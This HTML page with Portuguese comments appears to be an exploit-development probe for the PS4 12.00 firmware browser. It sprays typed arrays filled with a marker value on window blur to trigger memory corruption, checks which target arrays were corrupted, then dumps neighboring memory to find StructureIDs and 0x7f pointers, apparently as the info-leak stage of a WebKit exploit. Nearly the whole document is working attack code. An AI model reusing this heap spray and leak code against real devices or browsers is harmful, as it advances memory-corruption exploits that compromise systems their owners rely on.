<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Deep Micro-Scan</title>
<style>
    body { font-family: sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
    button { padding: 12px 24px; margin: 5px; cursor: pointer; font-weight: bold; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; }
    button:hover { background: #444; }
    code { background: #000; padding: 8px; border-radius: 4px; font-family: 'Courier New', monospace; display: block; white-space: pre; margin: 5px 0; color: #aaa; border-left: 3px solid #444; font-size: 12px; }
    .vuln { color: #ff5555; font-weight: bold; }
    .pointer { color: #fff; background: #0077ff; padding: 1px 3px; font-weight: bold; border-radius: 2px; }
    .structureid { color: #000; background: #00ff00; padding: 1px 3px; font-weight: bold; border-radius: 2px; }
    .hit { background: #1e1e1e; border: 1px solid #333; padding: 15px; margin: 15px 0; border-radius: 8px; }
    .target-header { color: #00ff00; border-bottom: 1px solid #333; padding-bottom: 5px; }
    hr { border: 0; border-top: 1px solid #333; margin: 30px 0; }
</style>
</head>
<body>

<h1>PS4 12.00 - DEEP MICRO-SCAN</h1>
<p>Analisando a vizinhança de 20 índices ao redor de <b>293, 549 e 805</b>.</p>

<h2>STAGE 1: Setup & Corruption</h2>
<button onclick="setup()">1. CREATE ARRAYS</button>
<div id="setup_log"></div>

<script>
var g_arrays = { Uint8: [], Int8: [], Float64: [], BigUint64: [] };

function setup() {
    const r = document.getElementById('setup_log');
    r.innerHTML = 'Alocando 1000 arrays por tipo...<br>';
    
    for(let i = 0; i < 1000; i++) {
        g_arrays.Uint8.push(new Uint8Array(64));
        g_arrays.Int8.push(new Int8Array(64));
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.BigUint64.push(new BigUint64Array(8));

        // Marcar para detecção de corrupção
        g_arrays.Uint8[i][0] = i % 256;
        g_arrays.Int8[i][0] = i % 128;
        g_arrays.Float64[i][0] = i;
        g_arrays.BigUint64[i][0] = BigInt(i);
    }
    
    r.innerHTML += '<b>Configuração concluída. Pressione OPTIONS duas vezes no PS4.</b><br>';
    if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += `<br>Trigger ${triggerCount}... `;
        
        const P = 2.121995791e-314; // Gatilho 0x41414141...
        const spray = [];
        for(let i = 0; i < 4000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            r.innerHTML += '<b class="vuln">CORRUPÇÃO FINALIZADA.</b><br>';
            check_targets();
            window.onblur = null;
        }
    };
}

function check_targets() {
    const r = document.getElementById('setup_log');
    [293, 549, 805].forEach(t => {
        let u8 = g_arrays.Uint8[t];
        if (u8 && u8[0] !== (t % 256)) {
            r.innerHTML += `<span class="vuln">✓ Alvo #${t} sincronizado e corrompido!</span><br>`;
        }
    });
}
</script>

<hr>

<h2>STAGE 2: Deep Neighbor Dump</h2>
<p>Extrai todos os 8 qwords (64-bit) para localizar ponteiros <b>0x7f</b>.</p>
<button onclick="deep_neighbor_dump()">2. RUN DEEP SCAN</button>
<div id="scan_log"></div>

<script>
function deep_neighbor_dump() {
    const r = document.getElementById('scan_log');
    r.innerHTML = '<b>Iniciando extração de dados brutos...</b><br>';

    const targets = [293, 549, 805];
    const range = 20; // Range expandido para capturar deslocamentos
    let ptr_found = 0;

    targets.forEach(baseIdx => {
        let section = document.createElement('div');
        section.className = 'hit';
        section.innerHTML = `<h3 class="target-header">Vizinhança do Alvo ${baseIdx}</h3>`;
        
        for(let i = baseIdx - range; i <= baseIdx + range; i++) {
            if (i < 0 || i >= 1000) continue;

            let arr = g_arrays.Uint8[i];
            let view = new BigUint64Array(arr.buffer);
            let hexLine = "";
            let has_ptr = false;

            for(let j = 0; j < view.length; j++) {
                let val = view[j];
                let hex = val.toString(16).padStart(16, '0');

                // Destaque para StructureID 0x25
                if (hex.endsWith("25")) {
                    hexLine += `<span class="structureid">${hex}</span> `;
                }
                // Destaque para Ponteiros 0x7f
                else if (hex.startsWith("00007f") || hex.startsWith("7f")) {
                    hexLine += `<span class="pointer">${hex}</span> `;
                    has_ptr = true;
                    ptr_found++;
                }
                else {
                    hexLine += `${hex} `;
                }
            }

            // Exibe o índice e o dump completo de 8 valores
            let isTarget = (i === baseIdx) ? "style='color:#0f0;font-weight:bold;'" : "";
            section.innerHTML += `<code ${isTarget}>[#${i.toString().padStart(3, '0')}] ${hexLine}</code>`;
        }
        r.innerHTML.appendChild ? r.appendChild(section) : r.innerHTML += section.outerHTML;
    });

    if (ptr_found > 0) {
        r.innerHTML += `<br><b class="vuln">SUCESSO: ${ptr_found} ponteiros reais localizados!</b>`;
    }
}
</script>

</body>
</html>
